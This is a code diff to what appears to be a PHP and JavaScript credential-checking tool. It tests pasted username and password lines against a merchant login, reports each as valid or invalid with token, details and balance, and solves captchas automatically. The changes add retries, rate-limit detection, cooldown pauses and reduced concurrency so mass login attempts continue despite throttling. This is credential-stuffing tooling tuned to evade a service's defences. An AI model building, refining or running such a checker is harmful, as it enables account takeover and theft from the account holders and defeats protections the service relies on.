@@ -216,7 +216,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo json_encode(['user' => $user, 'status' => 'malformed', 'token' => null, 'error' => 'missing credentials']);
             exit;
         }
-        $r = ckLoginRetry($user, $pass, $merchant, null, 1, $captcha !== '' ? $captcha : null, $captchaId !== '' ? $captchaId : null);
+        $r = ckLoginRetry($user, $pass, $merchant, null, 2, $captcha !== '' ? $captcha : null, $captchaId !== '' ? $captchaId : null);
         if (!$r['ok'] && ckCaptchaHit($r)) {
             $auto = ckAutoCaptchaLogin($user, $pass, $merchant);
             if ($auto !== null) {
@@ -271,6 +271,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } else {
             $errMsg = (string) ($r['error'] ?? '');
             $errCode = (string) ($r['code'] ?? '');
+            if (ckIsThrottled($errMsg, $errCode)) {
+                echo json_encode(['user' => $user, 'status' => 'ratelimit', 'token' => null, 'details' => null, 'balance' => null, 'error' => $errMsg !== '' ? $errMsg : 'Rate limited', 'code' => $errCode, 'retry_after' => 3]);
+                exit;
+            }
             if (stripos($errMsg, 'captcha') !== false || stripos($errCode, 'captcha') !== false) {
                 $cap = ckFetchCaptcha();
                 if ($cap['id'] !== null) {
@@ -1375,7 +1379,19 @@ function askCaptcha(src) {
             j = { status: 'error', message: err.message };
           }
 
-          if (j.status === 'valid') {
+          if (j.status === 'ratelimit') {
+            throttled++;
+            row.pill.className = 'pill warn';
+            row.pill.textContent = 'Rate limited';
+            if (j.error || j.message) {
+              row.sub.hidden = false;
+              row.sub.textContent = j.error || j.message;
+            }
+            const retryMs = Number(j.retry_after) > 0 ? Number(j.retry_after) * 1000 : 5000;
+            cooldownUntil = Math.max(cooldownUntil, Date.now() + retryMs);
+            if (workers > 1) workers = 1;
+            addActions(row.actions, state, row, false);
+          } else if (j.status === 'valid') {
             valid++;
             row.pill.className = 'pill ok';
             row.pill.textContent = 'Valid';
@@ -1412,7 +1428,7 @@ function askCaptcha(src) {
             }
             addActions(row.actions, state, row, false);
           }
-          updateProgress(lines.length, valid, invalid + errors, ++done);
+          updateProgress(lines.length, valid, invalid + errors + throttled, ++done);
     }
 
     const entries = lines.map(function (line) {
@@ -1422,15 +1438,24 @@ function askCaptcha(src) {
       return { state: state, row: row };
     });
     let done = 0;
+    let throttled = 0;
+    let cooldownUntil = 0;
+    let workers = 2;
 
-    const CONCURRENCY = 2;
-    for (let i = 0; i < entries.length; i += CONCURRENCY) {
+    for (let i = 0; i < entries.length; ) {
+      const step = workers;
       const tickStart = Date.now();
-      showStatus(status, 'Checked ' + done + ' of ' + lines.length + '…', 'info');
-      await Promise.all(entries.slice(i, i + CONCURRENCY).map(function (entry) {
+      if (cooldownUntil > Date.now()) {
+        const pause = cooldownUntil - Date.now();
+        showStatus(status, 'Rate limited, pausing ' + Math.ceil(pause / 1000) + 's\u2026', 'info');
+        await new Promise(function (resolve) { setTimeout(resolve, pause); });
+      }
+      showStatus(status, 'Checked ' + done + ' of ' + lines.length + '\u2026', 'info');
+      await Promise.all(entries.slice(i, i + step).map(function (entry) {
         return runEntry(entry.state, entry.row);
       }));
-      if (i + CONCURRENCY < entries.length) {
+      i += step;
+      if (i < entries.length) {
         const wait = 1000 - (Date.now() - tickStart);
         if (wait > 0) await new Promise(function (resolve) { setTimeout(resolve, wait); });
       }
@@ -1440,6 +1465,7 @@ function askCaptcha(src) {
     btn.querySelector('span').textContent = 'Check all';
     let summary = lines.length + ' checked · ' + valid + ' valid · ' + invalid + ' invalid';
     if (errors) summary += ' · ' + errors + ' error' + (errors === 1 ? '' : 's');
+    if (throttled) summary += ' · ' + throttled + ' rate-limited';
     showStatus(status, summary, valid > 0 ? 'ok' : 'info');
   });
 
